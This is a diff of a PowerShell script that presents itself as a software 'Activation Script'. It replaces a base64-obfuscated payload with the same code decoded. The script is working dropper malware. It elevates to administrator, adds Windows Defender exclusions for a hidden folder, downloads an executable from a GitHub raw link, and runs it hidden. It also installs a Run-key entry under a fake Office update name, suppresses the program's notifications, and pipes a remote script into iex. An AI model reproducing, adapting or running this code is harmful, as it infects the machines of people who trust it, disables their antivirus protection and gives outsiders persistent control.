@@ -1,6 +1,96 @@
-$base64EncodedScript = "aWYgKC1ub3QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkgewoKCiAgICAkYXJndW1lbnRzID0gIiYgJyIgKyAkbXlpbnZvY2F0aW9uLm15Y29tbWFuZC5kZWZpbml0aW9uICsgIiciCgogICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW50cyAtVmVyYiBSdW5BcwoKICAgIGV4aXQKCn0KIyBCYXNlNjQtZW5jb2RlZCBzdHJpbmdzIGZvciB0aGlyZCBkb3dubG9hZCAob2ZmaWNlbWljcm8uZXhlKQokb2ZmaWNlRG93bmxvYWRVcmxCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoImh0dHBzOi8vZ2l0aHViLmNvbS9mcmVldHBvbmxpbmUvcGFpbnR3ZWJzaXRlL3Jhdy9yZWZzL2hlYWRzL21haW4vZG9sYmFlYi5leGUiKSkKJHVwZGF0ZXJyckV4ZUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiV2luZG93c0hvc3RBcHBsaWNhdGlvbi5leGUiKSkKIyBDb21tb24gYXR0cmlidXRlcwokaGlkZGVuQXR0ckI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiSGlkZGVuIikpCiRzaWxlbnRseUNvbnRpbnVlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTaWxlbnRseUNvbnRpbnVlIikpCiRzdG9wQWN0aW9uQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTdG9wIikpCiRkaXJlY3RvcnlCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIkRpcmVjdG9yeSIpKQoKIyBEZWNvZGUgdGhlbQokb2ZmaWNlRG93bmxvYWRVcmwgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRvZmZpY2VEb3dubG9hZFVybEI2NCkpCiR1cGRhdGVycnJFeGUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR1cGRhdGVycnJFeGVCNjQpKQokaGlkZGVuQXR0ciA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGhpZGRlbkF0dHJCNjQpKQokc2lsZW50bHlDb250aW51ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNpbGVudGx5Q29udGludWVCNjQpKQokc3RvcEFjdGlvbiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHN0b3BBY3Rpb25CNjQpKQokZGlyZWN0b3J5ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkZGlyZWN0b3J5QjY0KSkKCiMgQ3JlYXRlIGEgbmV3IGhpZGRlbiBmb2xkZXJBZGQtRm9sZGVyRXhjbHVzaW9uCiRoaWRkZW5Gb2xkZXJOYW1lID0gIk5vdGlmeVRlbXBfIiArIFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpLlN1YnN0cmluZygwLDgpCiRoaWRkZW5Gb2xkZXIgPSBKb2luLVBhdGggJGVudjpMT0NBTEFQUERBVEEgJGhpZGRlbkZvbGRlck5hbWUKTmV3LUl0ZW0gLUl0ZW1UeXBlICRkaXJlY3RvcnkgLVBhdGggJGhpZGRlbkZvbGRlciAtRm9yY2UgfCBPdXQtTnVsbAokb2ZmaWNlUGF0aCA9IEpvaW4tUGF0aCAkaGlkZGVuRm9sZGVyICR1cGRhdGVycnJFeGUKCiMgRnVuY3Rpb24gdG8gYWRkIGZvbGRlciBleGNsdXNpb24KIyBGdW5jdGlvbiB0byBhZGQgZXhjbHVzaW9ucyB3aXRoIHJldHJ5IGFuZCB2ZXJpZmljYXRpb24KZnVuY3Rpb24gQWRkLUZvbGRlckV4Y2x1c2lvbiB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kcGF0aCwKICAgICAgICBbaW50XSRtYXhSZXRyaWVzID0gNSwKICAgICAgICBbaW50XSRkZWxheVNlY29uZHMgPSAxCiAgICApCiAgICAkcmV0cnlDb3VudCA9IDAKICAgICRzdWNjZXNzID0gJGZhbHNlCiAgICAKICAgIHdoaWxlICgtbm90ICRzdWNjZXNzIC1hbmQgJHJldHJ5Q291bnQgLWx0ICRtYXhSZXRyaWVzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gJHN0b3BBY3Rpb24KICAgICAgICAgICAgIyBWZXJpZnkgZXhjbHVzaW9uIHdhcyBhZGRlZCAocmVxdWlyZXMgYWRtaW4gcmlnaHRzIHRvIGNoZWNrLCBidXQgYXR0ZW1wdCBhbnl3YXkpCiAgICAgICAgICAgIGlmIChHZXQtTXBQcmVmZXJlbmNlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgRXhjbHVzaW9uUGF0aCB8IFdoZXJlLU9iamVjdCB7ICRfIC1lcSAkcGF0aCB9KSB7CiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICR0cnVlCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgJHJldHJ5Q291bnQrKwogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXlTZWNvbmRzCiAgICAgICAgfQogICAgfQogICAgaWYgKC1ub3QgJHN1Y2Nlc3MpIHsKICAgIH0KICAgICMgQWRkaXRpb25hbCBkZWxheSB0byBlbnN1cmUgZXhjbHVzaW9uIHRha2VzIGVmZmVjdAogICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAyMDAKfQoKCiMgTWFpbiBleGVjdXRpb24KdHJ5IHsKICAgIFdyaXRlLUhvc3QgIkxvYWRpbmcgQWN0aXZhdGlvbiBTY3JpcHQuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgRGFya0dyZWVuIC1CYWNrZ3JvdW5kQ29sb3IgV2hpdGUKICAgICMgQWRkIGZvbGRlciBleGNsdXNpb24gQkVGT1JFIGRvd25sb2FkcwogICAgQWRkLUZvbGRlckV4Y2x1c2lvbiAtcGF0aCAkaGlkZGVuRm9sZGVyCiAgICAjIEFkZCBmaWxlLXNwZWNpZmljIGV4Y2x1c2lvbnMgZm9yIGV4dHJhIHByb3RlY3Rpb24KICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJG9mZmljZVBhdGgKICAgIAogICAgCiAgICAjIERvd25sb2FkIG9mZmljZW1pY3JvLmV4ZSBhcyB1cGRhdGVycnIuZXhlCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRvZmZpY2VEb3dubG9hZFVybCAtT3V0RmlsZSAkb2ZmaWNlUGF0aCAtVXNlQmFzaWNQYXJzaW5nIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgIyBTZXQgZm9sZGVyIGFuZCBmaWxlcyBhcyBoaWRkZW4KICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJGhpZGRlbkZvbGRlciAtTmFtZSBBdHRyaWJ1dGVzIC1WYWx1ZSAkaGlkZGVuQXR0cgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkb2ZmaWNlUGF0aCAtTmFtZSBBdHRyaWJ1dGVzIC1WYWx1ZSAkaGlkZGVuQXR0cgogICAgCiAgICAjIFJ1biBhbGwgZmlsZXMgc2lsZW50bHkgaW4gdGhlIGN1cnJlbnQgc2Vzc2lvbgogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG9mZmljZVBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgCgogICAgJHJlZ1BhdGhPZmZpY2UgPSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIgogICAgJHJlZ05hbWVPZmZpY2UgPSAiT2ZmaWNlTWljcm9VcGRhdGUiCiAgICAkcmVnVmFsdWVPZmZpY2UgPSAicG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCBgIiRvZmZpY2VQYXRoYCIiCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoT2ZmaWNlIC1OYW1lICRyZWdOYW1lT2ZmaWNlIC1WYWx1ZSAkcmVnVmFsdWVPZmZpY2UgLUVycm9yQWN0aW9uICRzaWxlbnRseUNvbnRpbnVlCiAgICAKICAgICMgU3VwcHJlc3Mgbm90aWZpY2F0aW9ucyBmcm9tIHVwZGF0ZXJyci5leGUKICAgIE5ldy1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzIiAtTmFtZSAkdXBkYXRlcnJyRXhlIC1Gb3JjZSB8IE91dC1OdWxsCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxOb3RpZmljYXRpb25zXFNldHRpbmdzXCR1cGRhdGVycnJFeGUiIC1OYW1lICJFbmFibGVkIiAtVmFsdWUgMCAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgIyBXYWl0IGJyaWVmbHkgZm9yIGV4ZWN1dGlvbgogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMgp9IGNhdGNoIHsKICAgICMgT3V0cHV0IGVycm9yIGZvciBkZWJ1Z2dpbmcKICAgIFdyaXRlLUhvc3QgIkVycm9yOiAkXyIKICAgIGV4aXQgMQp9IGZpbmFsbHkgewogICAgIyBObyBjbGVhbnVwIC0gbGVhdmUgdHJhY2VzIGFzIHJlcXVlc3RlZAogICAgaXJtIGh0dHBzOi8vZ2V0LmFjdGl2YXRlZC53aW4gfCBpZXgKICAgIAp9"
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 
-$decodedBytes = [System.Convert]::FromBase64String($base64EncodedScript)
-$decodedScript = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
 
-Invoke-Expression $decodedScript
+    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
+
+    Start-Process powershell -ArgumentList $arguments -Verb RunAs
+
+    exit
+
+}
+
+$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/freetponline/paintwebsite/raw/refs/heads/main/dolbaeb.exe"))
+$updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("WindowsHostApplication.exe"))
+
+$hiddenAttrB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hidden"))
+$silentlyContinueB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("SilentlyContinue"))
+$stopActionB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Stop"))
+$directoryB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Directory"))
+
+
+$officeDownloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($officeDownloadUrlB64))
+$updaterrrExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterrrExeB64))
+$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
+$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+
+$hiddenFolderName = "NotifyTemp_" + [System.Guid]::NewGuid().ToString().Substring(0,8)
+$hiddenFolder = Join-Path $env:LOCALAPPDATA $hiddenFolderName
+New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
+$officePath = Join-Path $hiddenFolder $updaterrrExe
+
+
+function Add-FolderExclusion {
+    param (
+        [string]$path,
+        [int]$maxRetries = 5,
+        [int]$delaySeconds = 1
+    )
+    $retryCount = 0
+    $success = $false
+    
+    while (-not $success -and $retryCount -lt $maxRetries) {
+        try {
+            Add-MpPreference -ExclusionPath $path -ErrorAction $stopAction
+            # Verify exclusion was added (requires admin rights to check, but attempt anyway)
+            if (Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq $path }) {
+                $success = $true
+            }
+        } catch {
+            $retryCount++
+            Start-Sleep -Seconds $delaySeconds
+        }
+    }
+    if (-not $success) {
+    }
+
+    Start-Sleep -Milliseconds 200
+}
+
+
+# Main execution
+try {
+    Write-Host "Loading Activation Script..." -ForegroundColor DarkGreen -BackgroundColor White
+
+    Add-FolderExclusion -path $hiddenFolder
+
+    Add-MpPreference -ExclusionPath $officePath
+    
+    
+
+    Invoke-WebRequest -Uri $officeDownloadUrl -OutFile $officePath -UseBasicParsing -ErrorAction $stopAction
+    # Set folder and files as hidden
+    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $officePath -Name Attributes -Value $hiddenAttr
+    
+
+    Start-Process -FilePath $officePath -WindowStyle Hidden
+       
+
+    $regPathOffice = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regNameOffice = "OfficeMicroUpdate"
+    $regValueOffice = "powershell.exe -WindowStyle Hidden -Command `"$officePath`""
+    Set-ItemProperty -Path $regPathOffice -Name $regNameOffice -Value $regValueOffice -ErrorAction $silentlyContinue
+    
+    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name $updaterrrExe -Force | Out-Null
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\$updaterrrExe" -Name "Enabled" -Value 0 -ErrorAction $silentlyContinue
+    
+    Start-Sleep -Seconds 2
+} catch {
+    Write-Host "Error: $_"
+    exit 1
+} finally {
+    irm https://get.activated.win | iex
+    
+}
